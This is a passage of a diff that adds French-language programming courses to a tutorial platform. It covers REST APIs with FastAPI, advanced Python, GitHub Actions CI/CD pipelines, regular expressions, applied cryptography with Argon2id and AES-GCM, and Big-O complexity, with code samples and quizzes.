+PATCH → Modifier partiel (U - Update partiel)
+DELETE → Supprimer (D - Delete)
+
+Exemples concrets sur une API de cours :
+
+GET /api/cours → Liste tous les cours
+GET /api/cours/42 → Détails du cours n°42
+POST /api/cours → Créer un nouveau cours
+PUT /api/cours/42 → Remplacer entièrement le cours 42
+PATCH /api/cours/42 → Modifier seulement le titre du cours 42
+DELETE /api/cours/42 → Supprimer le cours 42
+```
+
+---
+
+## Codes HTTP : Le Langage des Statuts
+
+```
+2xx Succès
+ 200 OK → Réponse normale
+ 201 Created → Ressource créée avec succès
+ 204 No Content → Succès, rien à renvoyer (DELETE)
+
+3xx ↪ Redirection
+ 301 Moved Permanently → L'URL a changé définitivement
+ 304 Not Modified → Utilise le cache
+
+4xx Erreur CLIENT
+ 400 Bad Request → Ta requête est mal formée
+ 401 Unauthorized → Non authentifié (token manquant)
+ 403 Forbidden → Authentifié mais pas autorisé
+ 404 Not Found → Ressource introuvable
+ 429 Too Many Req → Rate limit dépassé
+
+5xx Erreur SERVEUR
+ 500 Internal Server Error → Bug côté serveur
+ 502 Bad Gateway → Serveur intermédiaire défaillant
+ 503 Service Unavailable → Serveur surchargé ou en maintenance
+```
+
+---
+
+## Structure d'une Réponse REST Professionnelle
+
+```json
+{
+ "status": "success",
+ "data": {
+ "id": 42,
+ "title": "Linux : Le Pouvoir du Terminal",
+ "level": "beginner",
+ "progress": 75
+ },
+ "meta": {
+ "timestamp": "2024-01-15T14:32:00Z",
+ "version": "v2",
+ "requestId": "a1b2c3d4"
+ }
+}
+```
+    """
+    codeblock "python" {
+      title: "API REST complète avec FastAPI"
+      code """
+# Installation : pip install fastapi uvicorn
+# Lancement  : uvicorn api:app --reload
+
+from fastapi import FastAPI, HTTPException, status
+from pydantic import BaseModel
+from typing import Optional
+from datetime import datetime
+
+app = FastAPI(title="TUTODECODE API", version="1.0.0")
+
+# --- Modèle de données ---
+class Cours(BaseModel):
+    title: str
+    description: str
+    level: str  # beginner | intermediate | advanced
+    duration: str
+
+class CoursDB(Cours):
+    id: int
+    created_at: datetime
+
+# Base de données en mémoire (remplacer par PostgreSQL en prod)
+db: dict[int, CoursDB] = {
+    1: CoursDB(id=1, title="Linux", description="Terminal",
+               level="beginner", duration="6h",
+               created_at=datetime.now()),
+    2: CoursDB(id=2, title="Docker", description="Containers",
+               level="intermediate", duration="4h",
+               created_at=datetime.now()),
+}
+next_id = 3
+
+# --- Endpoints ---
+
+@app.get("/")  # Health check
+def root():
+    return {"status": "ok", "message": "TUTODECODE API"}
+
+@app.get("/api/cours", response_model=list[CoursDB])
+def liste_cours(level: Optional[str] = None):
+    """Liste tous les cours, filtrables par level"""
+    cours = list(db.values())
+    if level:
+        cours = [c for c in cours if c.level == level]
+    return cours
+
+@app.get("/api/cours/{cours_id}", response_model=CoursDB)
+def get_cours(cours_id: int):
+    """Récupère un cours par son ID"""
+    if cours_id not in db:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail=f"Cours {cours_id} introuvable"
+        )
+    return db[cours_id]
+
+@app.post("/api/cours", response_model=CoursDB, status_code=201)
+def creer_cours(cours: Cours):
+    """Crée un nouveau cours"""
+    global next_id
+    nouveau = CoursDB(id=next_id, created_at=datetime.now(), **cours.dict())
+    db[next_id] = nouveau
+    next_id += 1
+    return nouveau
+
+@app.delete("/api/cours/{cours_id}", status_code=204)
+def supprimer_cours(cours_id: int):
+    """Supprime un cours"""
+    if cours_id not in db:
+        raise HTTPException(status_code=404, detail="Cours introuvable")
+    del db[cours_id]
+    # 204 = No Content, on ne retourne rien
+
+# Test avec curl :
+# curl http://localhost:8000/api/cours
+# curl -X POST http://localhost:8000/api/cours -H 'Content-Type: application/json' \
+#      -d '{"title":"Python","description":"Scripting","level":"beginner","duration":"5h"}'
+      """
+    }
+    quiz {
+      question "Quel verbe HTTP utiliser pour modifier partiellement une ressource ?" {
+        - "GET"
+        - "POST"
+        + "PATCH"
+        - "OPTIONS"
+        explanation "PATCH modifie partiellement une ressource (seulement les champs envoyés), alors que PUT la remplace entièrement."
+      }
+      question "Que signifie le code HTTP 403 ?" {
+        - "La ressource n'existe pas"
+        - "Authentification requise (pas de token)"
+        + "Authentifié mais sans permission d'accéder à cette ressource"
+        - "Trop de requêtes envoyées"
+        explanation "401 = non authentifié. 403 = authentifié mais interdit. La distinction est importante : 401 invite à se reconnecter, 403 dit 'tu ne passeras pas'."
+      }
+    }
+  }
+
+}
+
+course "python-advanced" {
+  title: "Python Avancé : Automatise Tout ce qui est Répétitif"
+  description: "Décorateurs, générateurs, async/await, manipulation de fichiers, web scraping, automation système. Python comme un vrai dev."
+  category: programming
+  level: intermediate
+  duration: "5h"
+  icon: Code
+  keywords: [python, async, décorateurs, générateurs, scraping, automation, avancé]
+
+  module "decorateurs" {
+    title: "Décorateurs : Le Superpower Caché de Python"
+    duration: 30min
+    content """
+# Les Décorateurs : Modifier une Fonction Sans la Toucher
+
+Un décorateur, c'est une fonction qui **enveloppe** une autre fonction pour lui ajouter du comportement — sans modifier son code source.
+
+C'est le principe ouvert/fermé en pratique : ouvert à l'extension, fermé à la modification.
+
+---
+
+## Anatomie d'un Décorateur
+
+```python
+# Sans décorateur — mesurer le temps manuellement
+import time
+
+def charger_donnees():
+ debut = time.time()
+ # ... le vrai travail ...
+ time.sleep(0.5) # simulation
+ fin = time.time()
+ print(f"Temps : {fin - debut:.3f}s")
+
+# Problème : si j'ai 20 fonctions à chronométrer, je répète ça 20 fois.
+# Solution : un décorateur.
+
+def chronometre(func):
+ """Décorateur qui mesure le temps d'exécution."""
+ import functools
+
+ @functools.wraps(func) # Préserve le nom et la docstring de func
+ def wrapper(*args, **kwargs):
+ debut = time.time()
+ resultat = func(*args, **kwargs) # Appel de la vraie fonction
+ duree = time.time() - debut
+ print(f"⏱ {func.__name__}() : {duree:.3f}s")
+ return resultat
+
+ return wrapper
+
+# Application du décorateur
+@chronometre
+def charger_donnees():
+ time.sleep(0.5)
+ return {"status": "ok"}
+
+@chronometre
+def traiter_fichier(chemin: str):
+ time.sleep(0.2)
+ return f"Traité : {chemin}"
+
+# Utilisation normale
+charger_donnees() # ⏱ charger_donnees() : 0.500s
+traiter_fichier('data.csv') # ⏱ traiter_fichier() : 0.200s
+```
+
+---
+
+## Décorateurs Avec Arguments
+
+```python
+def retry(max_tentatives=3, delai=1.0):
+ """Décorateur : réessaie automatiquement en cas d'erreur."""
+ def decorateur(func):
+ @functools.wraps(func)
+ def wrapper(*args, **kwargs):
+ for tentative in range(1, max_tentatives + 1):
+ try:
+ return func(*args, **kwargs)
+ except Exception as e:
+ if tentative == max_tentatives:
+ raise # Relève l'exception si max atteint
+ print(f"Tentative {tentative}/{max_tentatives} échouée : {e}")
+ time.sleep(delai)
+ return wrapper
+ return decorateur
+
+@retry(max_tentatives=5, delai=2.0)
+def appel_api_instable():
+ import random
+ if random.random() < 0.7: # 70% de chance d'échec
+ raise ConnectionError("Serveur indisponible")
+ return "Succès !"
+
+print(appel_api_instable()) # Réessaie jusqu'à 5 fois automatiquement
+```
+
+---
+
+## Générateurs : Traiter l'Infini Sans Saturer la RAM
+
+```python
+# Problème : lire un fichier de 10 Go en mémoire
+with open('mega_fichier.csv') as f:
+ lignes = f.readlines() # Charge 10 Go en RAM. Crash garanti.
+
+# Solution : un générateur qui lit ligne par ligne
+def lire_par_batch(chemin: str, batch_size: int = 1000):
+ """Générateur : lit le CSV par blocs de 1000 lignes."""
+ batch = []
+ with open(chemin) as f:
+ for i, ligne in enumerate(f):
+ batch.append(ligne.strip())
+ if len(batch) == batch_size:
+ yield batch # Pause ici, reprend au prochain next()
+ batch = []
+ if batch: # Dernier batch incomplet
+ yield batch
+
+# Utilisation : seulement 1000 lignes en RAM à la fois
+for batch in lire_par_batch('mega_fichier.csv'):
+ traiter(batch)
+ # Le batch précédent est libéré de la RAM automatiquement
+```
+    """
+    codeblock "python" {
+      title: "Async/Await — performances I/O avec asyncio"
+      code """
+import asyncio
+import aiohttp  # pip install aiohttp
+import time
+
+# === VERSION SYNCHRONE (lente) ===
+import urllib.request
+
+def fetch_sync(url: str) -> int:
+    with urllib.request.urlopen(url) as r:
+        return len(r.read())
+
+def main_sync():
+    urls = [
+        'http://httpbin.org/delay/1',
+        'http://httpbin.org/delay/1',
+        'http://httpbin.org/delay/1',
+    ]
+    debut = time.time()
+    for url in urls:
+        fetch_sync(url)  # Attend 1s, puis passe au suivant
+    print(f"Sync : {time.time() - debut:.1f}s")  # ~3 secondes
+
+
+# === VERSION ASYNC (rapide) ===
+async def fetch_async(session: aiohttp.ClientSession, url: str) -> int:
+    async with session.get(url) as response:
+        return len(await response.read())
+
+async def main_async():
+    urls = [
+        'http://httpbin.org/delay/1',
+        'http://httpbin.org/delay/1',
+        'http://httpbin.org/delay/1',
+    ]
+    debut = time.time()
+    
+    async with aiohttp.ClientSession() as session:
+        # asyncio.gather() lance TOUT en parallèle
+        resultats = await asyncio.gather(
+            *[fetch_async(session, url) for url in urls]
+        )
+    
+    print(f"Async : {time.time() - debut:.1f}s")  # ~1 seconde !
+    return resultats
+
+# Lancez les deux et comparez :
+# main_sync()                    # 3 secondes
+asyncio.run(main_async())        # 1 seconde — 3x plus rapide avec 3 requêtes,
+                                 # 100x plus rapide avec 100 requêtes !
+      """
+    }
+    quiz {
+      question "Quel est le principal avantage des générateurs Python ?" {
+        - "Ils sont plus rapides que les listes pour tous les cas"
+        + "Ils permettent de traiter de grandes données sans les charger entièrement en RAM"
+        - "Ils permettent d'exécuter du code en parallèle"
+        - "Ils remplacent les décorateurs"
+        explanation "Un générateur produit les valeurs une par une avec 'yield', permettant de traiter des fichiers de plusieurs Go sans saturer la mémoire."
+      }
+      question "Pourquoi async/await est plus performant pour les requêtes réseau ?" {
+        - "Il utilise plusieurs threads en parallèle"
+        - "Il compresse les données automatiquement"
+        + "Il libère le thread pendant l'attente I/O, permettant d'autres tâches simultanées"
+        - "Il utilise un protocole réseau plus rapide"
+      }
+    }
+  }
+
+}
+
+course "devops-cicd" {
+  title: "DevOps & CI/CD : Du Code à la Prod Sans Stress"
+  description: "GitHub Actions, Docker, pipelines automatisés, tests, déploiement continu. Comment les équipes pros livrent du code fiable chaque jour."
+  category: devops
+  level: intermediate
+  duration: "5h"
+  icon: Loop
+  keywords: [devops, CI/CD, GitHub Actions, Docker, pipeline, déploiement, automatisation]
+
+  module "qu-est-ce-cicd" {
+    title: "CI/CD : Livrer du Code sans Prier"
+    duration: 25min
+    content """
+# Le Vendredi à 17h — Ou Comment Ne Plus Avoir Peur de Déployer
+
+Dans une équipe sans CI/CD, le déploiement ressemble à ça :
+
+```
+Vendredi 16h45.
+"Bon, on déploie ?"
+"Euh... avec la feature de Marie qui n'est pas finie ?"
+"On attendra lundi."
+*Lundi matin : 3 hotfixes urgents + conflits partout*
+```
+
+Avec CI/CD, chaque commit en main est testé, validé, et déployé automatiquement en moins de 10 minutes. Les vendredis redeviennent des vendredis.
+
+---
+
+## CI vs CD : La Nuance
+
+```
+CI — Continuous Integration
+→ Chaque push déclenche : compilation + tests + analyse de code
+→ Si un test rate : le merge est bloqué. Jamais de code cassé en main.
+→ Outils : GitHub Actions, GitLab CI, Jenkins
+
+CD — Continuous Delivery / Deployment
+→ Delivery : build automatique prêt à déployer (humain appuie sur 'Go')
+→ Deployment : déploiement automatique en production (zéro intervention humaine)
+
+Chaîne complète :
+Commit → Tests → Build → Staging → [validation] → Production
+```
+
+---
+
+## GitHub Actions : Pipeline en YAML
+
+```yaml
+# .github/workflows/ci.yml
+name: CI Pipeline
+
+on: # Déclencheurs
+ push:
+ branches: [main, develop]
+ pull_request:
+ branches: [main]
+
+jobs:
+ test:
+ runs-on: ubuntu-latest # Runner GitHub gratuit
+
+ steps:
+ - name: Checkout du code
+ uses: actions/checkout@v4
+
+ - name: Setup Python
+ uses: actions/setup-python@v4
+ with:
+ python-version: '3.12'
+
+ - name: Installation des dépendances
+ run: pip install -r requirements.txt
+
+ - name: Linting (qualité de code)
+ run: flake8 . --max-line-length=100
+
+ - name: Tests unitaires
+ run: pytest tests/ -v --cov=src --cov-report=xml
+
+ - name: Publication du rapport de couverture
+ uses: codecov/codecov-action@v3
+
+ build-docker:
+ needs: test # Ne build que si les tests passent
+ runs-on: ubuntu-latest
+
+ steps:
+ - uses: actions/checkout@v4
+
+ - name: Build image Docker
+ run: docker build -t tutodecode:${{ github.sha }} .
+
+ - name: Push sur registry
+ run: |
+ echo ${{ secrets.DOCKER_PASSWORD }} | docker login -u ${{ secrets.DOCKER_USERNAME }} --password-stdin
+ docker push tutodecode:${{ github.sha }}
+```
+
+---
+
+## Stratégies de Déploiement
+
+```
+Blue/Green Deployment
+→ 2 environnements identiques (Blue=actif, Green=en attente)
+→ Nouvelle version déployée sur Green
+→ Traffic basculé instantanément vers Green
+→ Blue garde l'ancienne version → rollback en 1 seconde
+
+Canary Release
+→ 5% du trafic → Nouvelle version
+→ Si OK après 30min → 20% → 50% → 100%
+→ Détection précoce des bugs sans impacter tous les users
+
+Rolling Update (Kubernetes)
+→ Mise à jour pod par pod
+→ Toujours X instances disponibles pendant la mise à jour
+→ Zéro downtime garanti
+```
+    """
+    codeblock "yaml" {
+      title: "Pipeline CI/CD complet — Test, Build, Deploy"
+      code """
+# .github/workflows/full-pipeline.yml
+name: Full CD Pipeline
+
+on:
+  push:
+    branches: [main]
+    tags: ['v*']  # Déclenche aussi sur les tags de version
+
+env:
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+
+jobs:
+  # ====== ÉTAPE 1 : Tests ======
+  quality:
+    name: Tests & Qualité
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.12' }
+      - run: pip install -r requirements-dev.txt
+      - run: pytest --tb=short -q
+      - run: bandit -r src/ -ll  # Scan sécurité du code
+
+  # ====== ÉTAPE 2 : Build Docker ======
+  build:
+    name: Build & Push Image
+    needs: quality
+    runs-on: ubuntu-latest
+    outputs:
+      image-tag: ${{ steps.meta.outputs.tags }}
+    
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Métadonnées de l'image
+        id: meta
+        uses: docker/metadata-action@v5
+        with:
+          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
+          tags: |
+            type=ref,event=branch
+            type=semver,pattern={{version}}
+            type=sha,prefix=sha-
+      
+      - name: Login au registry
+        uses: docker/login-action@v3
+        with:
+          registry: ${{ env.REGISTRY }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      
+      - name: Build & Push
+        uses: docker/build-push-action@v5
+        with:
+          push: true
+          tags: ${{ steps.meta.outputs.tags }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+  # ====== ÉTAPE 3 : Déploiement ======
+  deploy:
+    name: Déploiement Production
+    needs: build
+    runs-on: ubuntu-latest
+    environment: production  # Nécessite approbation manuelle
+    
+    steps:
+      - name: Déploiement via SSH
+        uses: appleboy/ssh-action@v1
+        with:
+          host: ${{ secrets.SERVER_HOST }}
+          username: deploy
+          key: ${{ secrets.SSH_PRIVATE_KEY }}
+          script: |
+            cd /opt/tutodecode
+            docker pull ${{ needs.build.outputs.image-tag }}
+            docker-compose up -d --no-deps app
+            docker system prune -f
+            echo "Déploiement terminé : $(date)"
+      """
+    }
+    quiz {
+      question "Quelle est la différence entre Continuous Delivery et Continuous Deployment ?" {
+        - "Ce sont des synonymes"
+        - "Delivery = déploiement automatique, Deployment = déploiement manuel"
+        + "Delivery = prêt à déployer (humain valide), Deployment = déploiement entièrement automatique"
+        - "Delivery concerne les tests, Deployment concerne le build"
+      }
+      question "Qu'est-ce qu'un Canary Release ?" {
+        - "Un déploiement qui se fait uniquement la nuit"
+        - "Un rollback automatique en cas d'erreur"
+        + "Un déploiement progressif qui expose la nouvelle version à un faible pourcentage d'utilisateurs d'abord"
+        - "Un système de notification en cas de bug en production"
+        explanation "Le Canary (canari dans la mine) expose d'abord un faible pourcentage du trafic à la nouvelle version. Si tout va bien, le pourcentage augmente progressivement."
+      }
+    }
+  }
+
+}
+
+course "regex-mastery" {
+  title: "Regex : Dompter le Texte en Une Ligne"
+  description: "Les expressions régulières semblent incompréhensibles — jusqu'au jour où tu les maîtrises. Validation, extraction, remplacement : le superpouvoir caché."
+  category: programming
+  level: beginner
+  duration: "2h30"
+  icon: Search
+  keywords: [regex, expressions régulières, parsing, validation, grep, sed, texte]
+
+  module "regex-fondamentaux" {
+    title: "Regex : De '???' à 'ÉVIDEMMENT !'"
+    duration: 20min
+    content """
+# La Première Fois que j'ai Vu une Regex
+
+```
+^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
+```
+
+Ma réaction à l'époque : *"Quelqu'un a appuyé sur le clavier avec le coude."*
+
+Dix ans plus tard, je lis cette regex en 3 secondes et je la comprends parfaitement. Les regex c'est un langage — et comme tout langage, quelques règles suffisent.
+
+---
+
+## Les Briques Fondamentales
+
+```
+CARACTÈRES LITTÉRAUX
+abc → Correspond exactement à "abc"
+
+MÉTACARACTÈRES (caractères spéciaux)
+. → N'importe quel caractère (sauf newline)
+\d → Un chiffre (0-9)
+\w → Un caractère de mot (a-z, A-Z, 0-9, _)
+\s → Un espace (espace, tab, newline)
+\D \W \S → L'inverse (NON-chiffre, NON-mot, NON-espace)
+
+CLASSES DE CARACTÈRES
+[abc] → a, b, ou c
+[a-z] → N'importe quelle lettre minuscule
+[^abc] → Tout SAUF a, b, c (^ = négation dans [])
+[0-9A-F] → Chiffre hex (0-9 ou A-F)
+
+QUANTIFICATEURS
+* → 0 ou plusieurs fois
++ → 1 ou plusieurs fois
+? → 0 ou 1 fois (optionnel)
+{3} → Exactement 3 fois
+{2,5} → Entre 2 et 5 fois
+{3,} → 3 fois ou plus
+
+ANCRES
+^ → Début de ligne
+$ → Fin de ligne
+\b → Frontière de mot
+
+GROUPES
+(abc) → Groupe capturant
+(?:abc) → Groupe non-capturant
+a|b → a OU b
+```
+
+---
+
+## Décryptage de la Regex Email
+
+```
+^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
+
+ Caractères Domaine Extension (2 chars min)
+ valides pour valides (.fr, .com, .io...)
+ la partie Séparateur
+ locale littéral @
+ Début de ligne
+
+Découpé :
+^ → Début
+[a-zA-Z0-9._%+-]+ → Partie locale (alice.martin+pro)
+@ → Le @
+[a-zA-Z0-9.-]+ → Nom de domaine (tutodecode)
+\. → Point littéral (\. = échapper le .)
+[a-zA-Z]{2,} → Extension de 2+ lettres (fr, com, org)
+$ → Fin
+```
+    """
+    codeblock "python" {
+      title: "Trente expressions régulières utiles en pratique"
+      code """
+import re
+
+# === VALIDATION ===
+
+# Email
+re.match(r'^[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}$', 'alice@tutodecode.fr')
+
+# Numéro de téléphone français
+re.match(r'^(?:\+33|0)[1-9](?:[0-9]{8})$', '0612345678')
+
+# IPv4
+re.match(r'^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$', '192.168.1.1')
+
+# Mot de passe fort (8+ chars, maj, min, chiffre, spécial)
+re.match(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$', 'MonP@ss1')
+
+# === EXTRACTION ===
+
+texte = "Contactez alice@tutodecode.fr ou bob@example.com pour plus d'infos"
+
+# Extraire tous les emails
+emails = re.findall(r'[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}', texte)
+print(emails)  # ['alice@tutodecode.fr', 'bob@example.com']
+
+# Extraire les URLs
+urls_texte = "Visitez https://tutodecode.fr ou http://github.com"
+urls = re.findall(r'https?://[\w./-]+', urls_texte)
+print(urls)  # ['https://tutodecode.fr', 'http://github.com']
+
+# Extraire les IPs dans des logs
+logs = "ERROR 2024-01-15 192.168.1.45 failed login from 10.0.0.3"
+ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', logs)
+print(ips)  # ['192.168.1.45', '10.0.0.3']
+
+# === REMPLACEMENT ===
+
+# Anonymiser des emails dans un log
+log_sensible = "User alice@tutodecode.fr logged in from 192.168.1.45"
+log_anonyme = re.sub(r'[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}', '[EMAIL]', log_sensible)
+print(log_anonyme)  # User [EMAIL] logged in from 192.168.1.45
+
+# Normaliser les numéros de téléphone
+def normaliser_tel(tel: str) -> str:
+    chiffres = re.sub(r'[^\d+]', '', tel)  # Garde que chiffres et +
+    if chiffres.startswith('0') and len(chiffres) == 10:
+        return '+33' + chiffres[1:]
+    return chiffres
+
+print(normaliser_tel('06 12 34 56 78'))  # +33612345678
+print(normaliser_tel('06-12-34-56-78'))  # +33612345678
+      """
+    }
+    quiz {
+      question "Que signifie le quantificateur {2,5} dans une regex ?" {
+        - "Entre la position 2 et 5 dans la chaîne"
+        + "Le caractère précédent doit apparaître entre 2 et 5 fois"
+        - "Exactement 2 ou exactement 5 fois"
+        - "La regex doit avoir entre 2 et 5 groupes"
+      }
+      question "Quelle est la différence entre . et \. dans une regex ?" {
+        - "Aucune différence"
+        + ". correspond à n'importe quel caractère, \. correspond au point littéral"
+        - "\. correspond à n'importe quel caractère, . au point littéral"
+        - ". est pour les débuts de ligne, \. pour les fins"
+        explanation "Le point (.) est un métacaractère qui correspond à n'importe quel caractère. Pour cibler un vrai point, il faut l'échapper avec \."
+      }
+    }
+  }
+
+}
+
+course "cryptography-applied" {
+  title: "Cryptographie Pratique : Chiffre, Signe, Protège"
+  description: "AES, RSA, hachage, signatures numériques, TLS — comprends les outils qui protègent les données de milliards d'utilisateurs. Sans maths incompréhensibles."
+  category: security
+  level: intermediate
+  duration: "4h"
+  icon: Lock
+  keywords: [cryptographie, AES, RSA, hachage, chiffrement, TLS, clés, HMAC]
+
+  module "hachage-vs-chiffrement" {
+    title: "Hachage vs Chiffrement : Deux Armes Différentes"
+    duration: 25min
+    content """
+# Le Malentendu Qui Coûte des Millions
+
+En 2012, LinkedIn se fait hacker. **117 millions** de mots de passe volés. La catastrophe ? LinkedIn avait haché les mots de passe en SHA-1 sans sel. En quelques heures, des milliards de hachages SHA-1 pré-calculés (rainbow tables) permettent de retrouver 90% des mots de passe en clair.
+
+La confusion entre hachage et chiffrement, et les mauvais algorithmes, sont des erreurs classiques aux conséquences dramatiques.
+
+---
+
+## Hachage : Une Rue à Sens Unique
+
+```
+Fonction de hachage = moulin à café
+
+Grains de café (données) → [MOULIN] → Café moulu (hash)
+
+ Irréversible : impossible de reconstituer les grains depuis le café
+ Déterministe : mêmes grains → même café, toujours
+ Sensible : 1 grain différent → café totalement différent (avalanche)
+
+Usages :
+→ Stocker les mots de passe (ne jamais stocker en clair)
+→ Vérifier l'intégrité d'un fichier (checksum)
+→ Signatures numériques
+→ Blockchain (chaque bloc contient le hash du précédent)
+```
+
+```python
+import hashlib
+
+# SHA-256 : l'algorithme standard
+hash1 = hashlib.sha256(b'tutodecode').hexdigest()
+hash2 = hashlib.sha256(b'tutodecod').hexdigest() # 1 char différent !
+
+print(hash1) # 2c3f5e8a... (64 caractères hex)
+print(hash2) # a9f1c2b7... complètement différent !
+# C'est l'effet avalanche : moindre changement = hash totalement différent.
+```
+
+---
+
+## Chiffrement : Aller-Retour Possible
+
+```
+Chiffrement symétrique (AES)
+→ Même clé pour chiffrer ET déchiffrer
+→ Rapide, efficace pour grandes données
+→ Problème : comment partager la clé sans qu'elle soit interceptée ?
+
+Chiffrement asymétrique (RSA)
+→ 2 clés : Publique (chiffre) et Privée (déchiffre)
+→ Je publie ma clé publique. Tout le monde peut m'envoyer un message chiffré.
+→ Seule ma clé privée peut déchiffrer. Je suis le seul à lire.
+→ Plus lent, limité à petites données (utilisé pour chiffrer la clé AES)
+
+TLS en pratique :
+1. RSA échange une clé AES secrète (asymétrique = lent mais sécurisé)
+2. AES chiffre tout le reste de la conversation (symétrique = rapide)
+```
+
+---
+
+## Mots de Passe : Ne Jamais Utiliser SHA-256 Brut
+
+```
+SHA-256 → 1 milliard de hachages/seconde sur GPU. Cassé en minutes.
+bcrypt → 100 hachages/seconde. Résistant par design.
+Argon2id → Le standard moderne. Résistant aux GPU ET aux ASIC.
+
+Règle d'or : SHA-256 = intégrité de fichiers.
+ bcrypt/Argon2 = mots de passe.
+ Ne jamais confondre les deux.
+```
+    """
+    codeblock "python" {
+      title: "Chiffrement AES-256-GCM et hachage Argon2id"
+      code """
+# pip install cryptography argon2-cffi
+
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from argon2 import PasswordHasher
+from argon2.exceptions import VerifyMismatchError
+import os, base64
+
+# ============================================================
+# PARTIE 1 : HACHAGE DE MOT DE PASSE avec Argon2id
+# ============================================================
+ph = PasswordHasher(
+    time_cost=2,      # Nombre d'itérations
+    memory_cost=65536, # 64 Mo de RAM (rend les GPU inefficaces)
+    parallelism=2,     # Threads
+)
+
+# Inscription : hacher et stocker
+mot_de_passe = "MonSuperMotDePasse123!"
+hash_stocke = ph.hash(mot_de_passe)
+print(f"Hash stocké : {hash_stocke[:40]}...")  # $argon2id$v=19$...
+# Argon2 inclut le sel automatiquement dans le hash ✅
+
+# Connexion : vérifier sans jamais déchiffrer
+try:
+    ph.verify(hash_stocke, "MonSuperMotDePasse123!")  # ✅ OK
+    print("Mot de passe correct")
+except VerifyMismatchError:
+    print("Mot de passe incorrect")
+
+try:
+    ph.verify(hash_stocke, "MauvaisMotDePasse")  # ❌
+except VerifyMismatchError:
+    print("Mot de passe incorrect")
+
+
+# ============================================================
+# PARTIE 2 : CHIFFREMENT AES-256-GCM (symétrique authentifié)
+# ============================================================
+# GCM = Galois/Counter Mode : chiffre ET authentifie. Standard actuel.
+
+def chiffrer(message: str, cle: bytes) -> dict:
+    aesgcm = AESGCM(cle)
+    nonce = os.urandom(12)  # 96 bits, jamais réutiliser le même nonce !
+    ciphertext = aesgcm.encrypt(nonce, message.encode(), None)
+    return {
+        'nonce': base64.b64encode(nonce).decode(),
+        'ciphertext': base64.b64encode(ciphertext).decode()
+    }
+
+def dechiffrer(data: dict, cle: bytes) -> str:
+    aesgcm = AESGCM(cle)
+    nonce = base64.b64decode(data['nonce'])
+    ciphertext = base64.b64decode(data['ciphertext'])
+    return aesgcm.decrypt(nonce, ciphertext, None).decode()
+
+cle = AESGCM.generate_key(bit_length=256)  # 256 bits = 32 octets
+message_secret = "Données ultra-confidentielles de TUTODECODE"
+
+chiffre = chiffrer(message_secret, cle)
+print(f"Chiffré : {chiffre['ciphertext'][:40]}...")
+
+dechiffre = dechiffrer(chiffre, cle)
+print(f"Déchiffré : {dechiffre}")  # Message original !
+      """
+    }
+    quiz {
+      question "Pourquoi ne faut-il PAS utiliser SHA-256 pour stocker les mots de passe ?" {
+        - "SHA-256 est trop lent pour la vérification"
+        + "SHA-256 est trop rapide : un GPU peut tester des milliards de combinaisons/seconde"
+        - "SHA-256 est une fonction de chiffrement, pas de hachage"
+        - "SHA-256 n'est pas sécurisé pour les données texte"
+        explanation "SHA-256 est conçu pour être RAPIDE (intégrité de fichiers). Pour les mots de passe, on veut le contraire : bcrypt/Argon2 sont intentionnellement lents pour résister aux attaques par force brute."
+      }
+      question "Qu'est-ce que le chiffrement asymétrique ?" {
+        - "Un chiffrement qui utilise la même clé pour chiffrer et déchiffrer"
+        + "Un chiffrement avec deux clés : une publique pour chiffrer, une privée pour déchiffrer"
+        - "Un chiffrement où les données sont divisées en deux parties"
+        - "Un chiffrement plus lent que l'AES"
+      }
+    }
+  }
+
+}
+
+course "algorithms-thinking" {
+  title: "Algorithmes : Penser Comme une Machine"
+  description: "Big-O, tri, recherche, graphes, programmation dynamique. Résoudre des problèmes complexes avec élégance. Prépare-toi aux entretiens tech."
+  category: programming
+  level: intermediate
+  duration: "6h"
+  icon: Psychology
+  keywords: [algorithmes, Big-O, complexité, tri, graphes, DP, entretiens, LeetCode]
+
+  module "complexite-bigO" {
+    title: "Big-O : L'Art de Mesurer l'Efficacité"
+    duration: 30min
+    content """
+# Le Code qui a Planté le Datacenter
+
+Un dev junior écrit une fonction pour trouver les doublons dans une liste de 100 000 utilisateurs. Le code fonctionne parfaitement en test avec 100 utilisateurs.
+
+En production, le serveur répond... jamais. 4 heures de downtime.
+
+Sa solution ? Une double boucle imbriquée. O(n²). Avec 100 000 éléments, ça fait **10 milliards d'opérations**.
+
+---
+
+## Big-O : La Complexité en Fonction des Données
+
+```
+O(1) Constant → Accès à un tableau par index
+ Toujours aussi rapide, quelle que soit la taille
+
+O(log n) Logarithmique → Recherche binaire dans un tableau trié
+ 100 éléments : 7 ops. 1 million : 20 ops !
+
+O(n) Linéaire → Parcourir une liste une fois
+ 2x plus d'éléments = 2x plus de temps
+
+O(n log n) Quasi-linéaire → Merge Sort, Heap Sort
+ Le meilleur tri possible en général
+
+O(n²) Quadratique → Double boucle imbriquée
+ 10x plus d'éléments = 100x plus de temps
+
+O(2ⁿ) Exponentiel → Problèmes NP (voyageur de commerce)
+ 40 éléments = 1 billion d'opérations
+```
+
+```
+Visuellement (n = nombre d'éléments) :
+
+ O(2ⁿ) 
+ |
+ | O(n²)
+ | /
+ | /
+ | / O(n log n)
+ | / /
+ | / / O(n)
+ |/ / /
+ | / / O(log n)
+ | / /--
+ | / / O(1) 
+ +> n
+```
+
+---
+
+## Trouver les Doublons : 4 Solutions Comparées
+
+```python
+from typing import list
+
+# O(n²) — La solution du junior qui plante la prod
+def doublons_naive(lst: list) -> set:
+ doublons = set()
